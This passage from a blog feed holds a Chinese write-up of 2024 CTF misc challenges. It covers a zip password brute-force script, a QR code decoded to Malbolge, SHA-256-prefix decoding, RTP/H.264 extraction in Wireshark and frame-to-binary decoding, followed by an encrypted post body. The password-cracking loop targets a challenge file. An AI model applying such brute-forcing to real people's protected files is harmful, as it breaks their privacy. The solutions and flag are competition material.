class="subst">&#123;number&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">zip_file_path = <span class="string">&#x27;attachment\\how much.zip&#x27;</span></span><br><span class="line">ta=<span class="string">&#x27;attachment&#x27;</span></span><br><span class="line">start_number = <span class="number">100</span></span><br><span class="line">end_number = <span class="number">5000</span></span><br><span class="line">try_passwords(zip_file_path, start_number, end_number,ta)</span><br></pre></td></tr></table></figure><p>正确的答案是738</p><p>解压出来一个被旋转、裁剪过的二维码</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021154814455.png" alt="image-20241021154814455"></p><p>用gimp等等软件处理一下，恢复二维码原来的状态</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/屏幕截图-2024-10-19-161455.png" alt="屏幕截图-2024-10-19-161455" style="zoom: 50%;" /><p>扫出来一串奇怪的东西，结合文件名可以知道这是一种叫做malbolge的抽象语言</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021155224782.png" alt="image-20241021155224782" style="zoom:50%;" /><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021155431647.png" alt="image-20241021155431647"></p><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><blockquote><p>剩下的感觉都是一些脑洞题，想不到，真的想不到。。。</p></blockquote><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Find-way-to-read-video"><a href="#Find-way-to-read-video" class="headerlink" title="Find way to read video"></a>Find way to read video</h4><p>题目说tessa3098把一个邮件模板放在了一个公共平台上。经过寻找，我们可以在gitcode上找到要找的东西。</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021160529550.png" alt="image-20241021160529550"></p><p>这是一个垃圾邮件隐写，解码可以得到一个BV号和一串看起来是session cookie的东西，可以直接base64解码</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021161213574.png" alt="image-20241021161213574"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021161701421.png" alt="image-20241021161701421"></p><p>通过BV号在B站上可以搜到九十集视频，全部爬下来</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021161943757.png" alt="image-20241021161943757" style="zoom:50%;" /><blockquote><p>当时是卡在这了，注意到了视频上移动的小白点，但不知道要干什么</p></blockquote><p>预期解没看懂，但是有一种方法看懂了。base解码得到的那一堆十六进制数，经过尝试可以发现是不同字符的哈希值头几位，写脚本还原一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">fhl=[<span class="string">&quot;252f10c&quot;</span>,<span class="string">&quot;acac86c&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;cd0aa98&quot;</span>,<span class="string">&quot;021fb59&quot;</span>,<span class="string">&quot;ef2d127&quot;</span>,<span class="string">&quot;6b86b27&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;2c62423&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;2c62423&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;19581e2&quot;</span>,<span class="string">&quot;6b86b27&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;3f79bb7&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;252f10c&quot;</span>,<span class="string">&quot;18ac3e7&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;4e07408&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;ef2d127&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;18ac3e7&quot;</span>,<span class="string">&quot;d10b36a&quot;</span>,<span class="string">&quot;01ba471&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;a318c24&quot;</span>,<span class="string">&quot;087d80f&quot;</span>,<span class="string">&quot;6b23c0d&quot;</span>,<span class="string">&quot;e596a8e&quot;</span>,<span class="string">&quot;18f5384&quot;</span>,<span class="string">&quot;e7f6c01&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;7a4a4b5&quot;</span>,<span class="string">&quot;ba5ec51&quot;</span>]</span><br><span class="line">ls=string.printable</span><br><span class="line"><span class="built_in">dict</span>=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">    ha=hashlib.sha256(i.encode()).hexdigest()</span><br><span class="line">    pre=ha[:<span class="number">7</span>]</span><br><span class="line">    <span class="built_in">dict</span>[pre]=i</span><br><span class="line">msg=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fhl:</span><br><span class="line">    ch=<span class="built_in">dict</span>.get(i)</span><br><span class="line">    <span class="keyword">if</span> ch:</span><br><span class="line">        msg+=ch</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163128597.png" alt="image-20241021163128597"></p><h4 id="Streaming"><a href="#Streaming" class="headerlink" title="Streaming"></a>Streaming</h4><p>追踪一下udp流，可以看到是在传一个h264视频</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163507342.png" alt="image-20241021163507342"></p><p>右键decode as改为rtp</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163552917.png" alt="image-20241021163552917"></p><p>可以看到DynamicRTP-Type-96，打开编辑-首选项，找到H.264，填入96</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163721533.png" alt="image-20241021163721533"></p><p>下载lua插件，提取H264视频</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163809591.png" alt="image-20241021163809591"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163825827.png" alt="image-20241021163825827"></p><p>用milkplayer播放一下，可以看到第一段flag以及一个hint</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021164035877.png" alt="image-20241021164035877"></p><blockquote><p>当时是卡在了这，知道肯定是要用这个flag1做某种key去解密另一个文件，但是试了半天都不对。。。又是一个脑洞</p></blockquote><p>实际上这里是要先进行异或ff，然后再进行AES解密。（不知道怎么想到的。。。）</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021182144527.png" alt="image-20241021182144527"></p><p>解压出来两个没有后缀的文件，其中一个用trid识别出来是png，用<a href="https://github.com/GGN-2015/macos_shadow_tank?tab=readme-ov-file">这个项目</a>在linux下提取一下得到第二段flag</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021190938509.png" alt="image-20241021190938509" style="zoom:50%;" /><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021191008647.png" alt="image-20241021191008647" style="zoom:50%;" /><p>另一个文件用010打开发现又是H264视频，照着之前的264文件在前面补3个00</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021192709223.png" alt="image-20241021192709223"></p><p>播放后发现是黑白帧的交替，转换成01二进制串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">vc=cv2.VideoCapture(<span class="string">&quot;C:\\Users\\jyzho\\Desktop\\s4cret.264&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    ret,frame=vc.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    gf=cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY)</span><br><span class="line">    <span class="keyword">if</span> cv2.countNonZero(gf):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;0&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021193450835.png" alt="image-20241021193450835"></p><p>flag{3b3a9c08-88c4-4d65-b59e-13891ba324da}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 强网拟态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟训练合集（需要密码）</title>
      <link href="/posts/301602e1/"/>
      <url>/posts/301602e1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c7977354e6931d48c0998ad1df0f9c9695ca92b43abbe794a87aaf3e2fee821b">6925a1c8432d5413bebb5d6da9aa0a4958cfe7a79e13a21ce808d9c90e0ccbf7181c75523a153b4ec0e5873dcf9ef1f96789351dd0e8d1597b97d10499800fa40f09309c2769b88ba209c172a6f668f6e3df514e708d019fce4f3c67902beaf3f5cd6026dcdb22b4922aefb02f267cb8a7599a0f0cfd015bae14f2327a1eac8abc7f41772d0e40f8f3646fac568f79aa3bafaa36bbdec6f02cb815a8d95bfe89de6bb5d4b2ace58d564c823b8172c6d1113d117d039e7e7375bac29dfee55f6b541734bc1a43599baa6f94f91ca050eaf84643d31bde0b05e5f62053cdce323485f800b74d8aa8da1d33cde151baa2d2b344e6c63962ac19bf26132a6ddb5c1900caeb6f8f8dac3b3e2e7dba58c325652fcbbc8e18e75e9acc6ba24d43549fab40a3daba70ea01e7f7f4a4589bd21c01ac0a65c71e0b49244113aacfb9cf51484b62f0975d2e4e1d3be85013db73a643d87f702d9718a6df3111b63d38388882f9d236b62a01088fc757fe00351875508b26e28c503bb7582ab5926db79b83a0e7f3baab00b4a0c9a1e7a2eb38f4ef842bffde9d5b86c22ae42064d218659e3c3ed42a7b3850964cd91e42dedd62ef42d6c36d11d28afb494219aed95c83b350e101a05a402d96f63488ce584a0eee2be92e9f5bb344e146ecfdef5aae565064e8d0446c282644f1f808d67d18e45cd9e9160ca632fcbab53dacc076e9bfcaedf39ea1146f264b2855d497b2980e5f4ce07b3fbf00daccbd4f492dbe04322a30cf0a5907064eb03efa4a493d22f80c1db0e7bcc2c62ffe9b1c9798d81a32c89b07eb69a29f346564664390a92d6ca496d87a9ad50aa15cec461aedad475ca5e2baebe08b87f3907e23cddece7e54586679d8e344ebee2608508d5904cae89eb36105ba35d2700535048471891ace2aa771d0bcbd473e07439e286e96fbcb5037ad1f24c3ad709d60d2ddab4e4656d5e2d22d7f940a3ab41234ddca0dc62b66ef4937209482ddbd1e832eb765ebc52e539f8fdb8b7cabc57f2a6903184b393867bbaa01affdb26fa26ae9fb22d188f8aa8c050dfe1d0e83e536f70d93fbf9b28af6f58a871ef532e012d5c4cf23f9ddcaa75b7a1c9f77191e04c404df07f9fbd644685ba33971e35bfc718db6dcb6520894c79ead3120220b775bf61111e3cde37d5d8b37853691abf26539068961bbc1d800a41a64f0430909c538e075f9db988694b5bfbc0e21c4e0fb81164170d1b3086b594b37d8b2fec62691b191629709f2613d637f0d75398391640954bdf804e6dfb12a4c6c776d4340f71699c58f41065d4581d336d70cf7a49e9fc9c1f39fe2297491394bfed771ae3f44599f3db7656b860791b1a1ad1357f169fb224b7d182a223614bb041194f06ef31e71c43a0d6a5166d93239805761230d13ea2757837925f8db3d933cc428062d28c4144c2d08ed4a8f9b64adc2a0e5489121a6ee3ee06b423a055c93c8faff3e95397b7d566ff5056dee51b4c0e6631aaf29ab755938c829d7bdb6abd23cf879aa51ccec09aedfa0dedd02eeab6f783bbb58988bb0c517713b7c6e4c7463c0fc0db4e1a87280915de294b69e2473050ca29d17f988483e70b8634dccd70f4750222c01960166566a83f58b909f420aa6970d88c53fc54966f1579e34be118aac09d51b54f838543224152edc87d091fec4650e80cb0100f33a6d9a54930f3bd099977f2950881081db529389f1566d7feeb24a9f0d491cab6a16af322228614b977b7e2538f34174bd212fa2fb01bdc086e2f753518645fcdf9877bf4aa890bdf6342a7df916933d5f66a698b13cf6d94ce70caad644c09f0806c14c77688ef84bd4fb70925fad59f995b9d1813274427d10791adf21ecac5eb24584f00800fdcd02ab242e1cef67c650613a94f1ffe92836b6328933153b56e65a4a35fb2270b9a9e325d33eeec98db0e897f3321b40917ec24f75814a147aa00cc87bd809cdd3bc4d0341c65e258e81cdc3073a644124aff44724c7ee40afbb5c2897a5d6e27bf8865c69127ef5b9f16b9d5d339e84cff917db10f0c82110af7cb0991103eacf76c4261efa1bbd7d07a07188a9b51231343185772cec89b9f263524fe447aaa365311b1f89781ca7198511b709f44bc82198732acc8ac83f46ede70ce8abea25a621068f03551b61d75317fe84e55b4bf197f2abad3d48c59e5f3ac8fef083e6d94720c53fcd550de76de8f552f460a21edd3836d4fc391f321a935509319812cfbd6c24829bc18f76c60872e07fae498305b43910e6bfe2e8281bc006d4a6cd538866ceda360a37a77c84362c17d6466c43a540baa1e2b65c4fb5cd7aafd3dcc78a9fb20904305d67961abbc8da820a00efbd8bc7ccc48c40f021af3a02df58ac4bbfa9c037023d23bcb766d19a5e3b6c790f30aea830f85916b496567840ee11409bb488ebd570c07d2dc251c92de5cfc0514311ba2b44238ec4a4ee0c71ac342b2247d6089fb3bbcd75e730470ca60b409e0a08ad54f7347ec6af3305069957ae6f0a60c4eaa44738b8d1dd314b01e0f0f8cbd2af373edce051b8ca91cece35e3208b69e67ae867e49a4c3410c04b039d41cc658ce6e14e8c9129653566c80dff9742cb40e2f3a68529f1d4d568ca8da6f36ffe3b79532bb7a65998b4912b4f725f9d1311bad96871bafc4bc8c176513de146635d89f227bf9a25b0d88dea5b0ee792d60689b2dac4c2f5659a051c86d75550e3e75df0e2e21cf5912f372ce6ecbd2b2a584d26266a0b5e2e0e557b8a499f0c27d3915de1eb21c29ef6c3d0c4d0a35158d8cb2c415749b64f5c5c8c4d4abb22e173e0e32382adba6561bad9e3d06150ac0b14a4413dc3d2db3469724dcefab96c85a9663de596a3acc5de10c52f6d6aac7d077b36510672059a7e95e01b2e34080607e01f5010fe812bcfd32a300ee45dba26960d6bca250138b075d99103e987d1275c061ebeb69e8a3ba4baa44f05b09b80a7859e55a9597b27a3be3bb35316763adef3c70bd94fe969c11635612146239b1deb89fe309d92e2edb353b0745648d141bb9548b66e4d75a4e83eafdd14ef4d8783ea999d17a681b6e1d79cf4c5cb9cbc50b87d6436d6731dbe38e122d1b85cbed4e80ae28f7e23698ce9c819b50800033e662a60b0911220e1eaa5fee7b74284d83e2a5ecf270c6e8a917b4a7c95bea85e55c2a93751e62a61c116efb6dfc6719ed096fb418cbe4141f12c4cef1a14829b41655a7dc917313cd2c60176689aa113b6a7a84a82d8ac3e50fa38fa54cce790bbd79e61770203377617715060da8d863cf7fcde3f8da6812f01e0b77a4cbdf8f6ae9573998fcacd5dc1e2230d611cae92f0b910a35fed9c6ae3023a6ec1667001e85646e5e931d86b33203d0d062826bf418f4e4a63f7c0f2e0ec852cd66e06368e233add29b0632e4916d1b2bbb4aca771da0c61b0bd02d068f234a5b9c679385519d3844bd22576bac49a5d8a14e96f050f02670b92723064b4021852885194983c33d7607afcf819b95bcbc7360879871106d775d53eab55b7f21ac53b69998f63954c8680160900c31fb403b2b736c160d218aa5bc73c4e6495709c2b189a5195c61738014369a36c35951fa16d6c813327d12207d9c8cb5623df13b6e813755197c2193731b0b5b8a3b7b355d842d96cf98bf3029ca3b4167f94db2dde6c68ef04cfcde74c47c9aba64da312875e4811246036dfdc5ae24573497db652db3aa6e2173240995b6b5b9e67b96259a06188b5933c2a805c843f05cb0f9a921805a5369ff1528f4aaa0befc8e705bee07e14be8b1758e063b1ff0adb6e1d7bfcee2c49d5270d140a1ddf3b1c32d87973bbed9e63212fcbeddea7353af5266846a1032430f3b598f91bc5630190a582035743a7e42fbd5690eacc2c4ca134763c92db506d31585e5bc67d622a0011bebe46c5892cea27de9322f4d8fad3f9d86bc00feef7ca80307437f0af1dff7e96a89a988b6c145a0c3443db83a4f75003c6797aebb4ebdbd37f4d6eed6ce68920cb2eda1d2875d348e364bdee51c39b2c19061bb9ae9f639a15259c912175883bfba05c1ab0058a84f0909bcbbdb92cdc75aa7aae890eac372db2cc5cb10f403291bec128de2b988d675efca6e3154d2acff153b2230efa934ebabce8a1111c4ffc5ea0dc984b67ccab760dd0f9de9b12b9891852a8f8b7c61c403ffe2d41ccedbc2cb2bb12a4504a951baeb02bebd62fd366d1dfc178bbbb990b2ec17840d7670b41a1471febf13461f8ca7ad7b6f386b79f4bfa41795d68948a71bff00ecdd5ccf5dba11831de810975b41052d64fd7aa0b4b5b086463eeb606b6f41059fda4c58398046ce290c50e2ed611e16720139b12b7bd0675bed390c2058131a0372da63cc10ceb8054a311893b5118dafcb7cdb903ce204f92e699d3dc3c7a3c089288ac964528dd89b5d9d4e18cc4bcdf804dc17e158f57b6f307318056d26a91d296d6339a133bfb1461d72efede248bde2fdd846363d0405fe1843cff03ab35832386174abfed987cfd898a1a774888ce1beb8e5ba8cdc0d8a41dfa5363f3f49bbd3cbe3250fede312f425632fa079dcd572848d17573717d063d2f43016827361d886af3a19ee79e895e7e5d3a40e3ce7c4e9c573b1962fd402d983d75d99e4c3ad0e3d341ac0fe51b40322eca2a341a29b1b7c1e749c44115938ff5c656b1d94d6fd9547639196138f2e1db95533b35b9c8bdefb3d6c88c66f9942603f7ae05ebe23c50b50a5080ff51062b4765719698038e8373858c7fee879fca7b415f99b8b5e1945666d9505aa23c34326e3fda1880de1d491ba3fc8f97d2e3a1e7d210c7459ecd051dbe4985905de4e8151889eeaaa9d634f20939b7c8f5ec3ebcd62195967319cce18ce149b76b0bb51f45ce3d127526950906f21c2dae27fb98be930cbbb19e03af02440af425dbb2bbc7f31ea21299d0f9df9d2aa4fabb8979e46d660a40b6a3cf963c47a6b11c6b6a9f78d64f3604855f484bcd2c8739ae6973ca961f68ebfc48ef3a288a85cd7a0631247c25674b8259fc19ab291b52503e9914a5856d6602b7eecdae32de9040cc3572d9e39901b0fc2e81bde6ef6b0599b52253ca63ba78f143a9a09f4d28dba08c97a578a1bc14db34cd92dd1e32cf764c40e547d04127523314d931e473b45ff11c26169134f0491af1076c912d872fe9d56731497f8cac9a62c1655544ec60c56a7d74ab7f380798e8179baa17b5ad32275714401fe560259ec22e62482aded6c727426382ec6c5233efaa9ff1f2d58f7540d358955a2bb4a9094552ef079d26c5ee6b97c224f9d5d0b4fb2e93a38eb3059703d8c9ad76593276c2cf1a0cd595d58f22ce369e67bab553d6e413dec3a5591dea847d9474b3b16ff0c7665eb0b5158eac10890c7df2a1f41f34bc0ca610f5befecb24e4bf4d5afd3bcd288eb149d5de695dd86e3e044cf1942bc85ce3ef02eb8626fecd9c0ad2522e28cde2b9c8f0e47003a1adf0c5f7973997f8b7cab92727d0d346aa80e4c85ed693a6b444d29bc1d7ed121ecd952712e5091034066ea5fd83895e905eb2f5e08d44c32146b156d88eb04d1c91122c4ac3ff035a142601cfe5a9d48bba3c9c822f5be069b0a12666ec96deba2f6e4b260c5ea0583df8214b3cc3161048e848a4d35f74422c49a4ed15f6b51a288848150beb95f77c20dc794841eb46590df162b684ec4b6064fd073e04b88548254e572d1733f5f60ceed4275dd876100a2b0833bb0512b61277e89ba002f6939ebec239e7798c771d248b87c37e8de013dab97aad1656e5238f40decec1d335dc0fc517141c2ad562527815f064036a9360807a557f3b99fa5dc3637fa26c7997c7505eef50c27f10ba5b3a000adb958986094c64693192ed5fc591cd11b7129d7127968dedb889853a0ba4438fce941efc6997ed4baad97aaee5aec61f66e269a1dc9d271d3af0f0ee9d369a5de1f1b4150f5ee5151cb5a894251d0c9b0180eee53c1b47b84dbd23ac5a254901694b609730d080612574bf9635b4f5dd7303ea025a5a285b7870780077adca61cb1e8e68819032df0ccb73ce5c9b257d5c5419c222636c3e60b8f7753d9f6a7601ff28e5dcaa13a0b6551183659d5809e4308efaac1bbd0a6bcdce144f9e3e70aff5552128294d9ae858f1ef5f7aaacb29d5ee466547f996664d0cca0754fffd95d4196d44a5f0ed3db861d074752af7b84f08bde88dae79b53c4c5484d86c2521b4652bdf7457ddeaee7e5d47fa32ea65a733324861c73b49887ab945ccfd09261c02493e57fabe1f7362d1674b13011625f90fc884c77749b9adbf8e85087fbbf0f7a9819353ee1eb6f83426b4e9d3b46aae32acef06e8acb0c731e255c74fce5c80b3641648098dfc3c966a28b9f69a965a4e9d9c3dd5483f1dcb3ea9097fb457b749ded40c2ee9899523d592ff90e0598b73238a0e3f476dc5a63d0e5eec81f33bbb6eee662685383c636a6cbce14580d3def59b706a21c7e37fe815a2d8b98202c0cbf83ae33c2a8189525f77bed50ae7ee5639c8b17cea97dc586baa5b7196fd8ad4765594e6c1943a032bb3424f762c7955b0d681c8277e5d094dc947f152c947aa8ca3054e99b99e1491a5d6d0aed2cc984e6fef845da4fc8e677283755b50db1cce65175a9cc190174fae2090864a3f61f3e16c26b2ba9c6b904081e34b0ff7f3681f7ec2d49808f0d4f79934dbfcae227045d747c637ea2030eb8b22293a50a3112ba793b35d22bb028b5c1e0e520af261f0c2799e9a5a16e1ab9bc5f90432bb0538952648756bcee5531ed6b963d32d14287f1a2061996d38f1538e69e29a9420ed261eb304fdf91d990aed8353580680cb7fad824a5f5a5d3c7ee6115f5787beaff9231f80785a75cf443f202bcc2dd93888ec5eb5216e2bf7bea3e109166ba328e2dedfcfd96959dd2788b90cf7389d764d751745701041fe09216bba416013f8b8aeda38aabefe3eb9aefc4416d8fae9d32421c45b1f9b19d98c112c4efa2a9f67b6735721ae5bcd2bb9784707d7450d50b2dabae10be44fd18d2cf724dd5fa00f45cfdece87f017e28ed586bd2cac383590fd311b6c99befff3c6ba3ef30d87041e397e75e9b0db2863d17bbeaa8347164d8eab8ba57ed0515618151f6acd5c6d87fd89b4ed921d61a281cfde640695a9449b8e5d055de38814761e4d5315d0c789609711066d93738075a2ef9b848d413c102fc49ef228a8d24d3d08e20e59e1e2ccf437a1637406726fdebca78450b9a1b6e2aa60245532dd4fa0d5ba0ab9dd01543c99f3908cf0c3ddd58b4f2317e3ec9171d76fa4377d652898977a7d4bf1cb3de7ba99d5a72668cd7e15fe134b93e54c736b3512f39507bd68a371874ad8872ddde79c8ad9aabb92d800040c16ac59362dc60a434b89ade855adad44351732317c80b983b463645258984570315d10ebf6cfac496d2590d19f89fbc9d82103cd4623d33118f23e735367db97f0555c995c71f21ba4996b5db70513274c0cdee57c7ca5131ed8c5f0dd5a7f33a098180eae24278ff798ff7af9bdfb2a24e4772449dcad401c16c134d20b124d9e7f7271dbd4b5c1eed8e70f3564ccf980a33bf5a6437cbe98feea3061c05a9f9f9f79b646de711bedaac30b076c8516657a98561accff8e8534c1ebc3b40186c44d89ad9e76ed2420b4b954958f3542fd79509e656a3d06d1eb03baf5abb63dd8c8fa7a9c11942d220cf87e343b5987086e82329c3c541f3a0d583049646bcca7ad16ae74fa8406bb2c5b4cca6d77ccb8561e6959b91a06fd4d9ab358b1536a68e46b7634777e408f83b3b03c422e96924ac647d11dcee8696fc46fb2dc2a2397d58d99b30cfc5a33bc7cd6622ead48a906ec77b470ee49e99941906ed2e8c83b5337bedceffc4afe330b52006d672f899b874159c62da3aa77592b139de2c91e3d99c7722e1ab9c7878d4c78f35119739e641d072c6f2e2b57c7f87f50fa1348eb46ac147b59a6fb5a1a0d6b64a856bab7414f3e7938d175bdcabd601fbea86025a36218d87233577218ddd10bdd17f29c0087305033fa766afdf09bc79aa80a3fe1d9e4091e5c5469332b1f3282984584b089f9326f3fbbea6f76c6bacea43cdd213bee312c00a167f6a5dd1a4b85bd5c55b0ecd621738249a022ec29c78b805d5ac12c9eb4080a2f59ef8d9a6074c8da38f71a312d5c3bdeb499e3eb88f7c9cc2077909cc3d001b0cc2c8db43bff9c673000720bc622f31b61d6685775f8c14375b0b8b2402e9da373ce44f92e061204c918676802fc69bf1a468e29fa021ba0ee5ed40de91b66961a6cbc8fb782c790ae5cfb9f5d173c2ef1d4a67149bc690d77f4dfe6169beb811327e079c8ca17926887a22376bee8ebb5078f644f08905bb5613bd0cab621d49123dde3ba288e2563b6d81825ab9686806dd4c3d80b612a011a82743c1d7cdfbf03dc5e06e0cc3e78467fd14029380aa7f9e79daf27712f27c16f3d87a2c6565509bf0a33a95e10a1dcbb8e4e703a7786bc210713a6bdfb4f14ed880f98549aa79b91103837c551b2b432ec770ba3273bfc6aebfc707505fc1ad97ebabac3e16c9ad3c64366452d6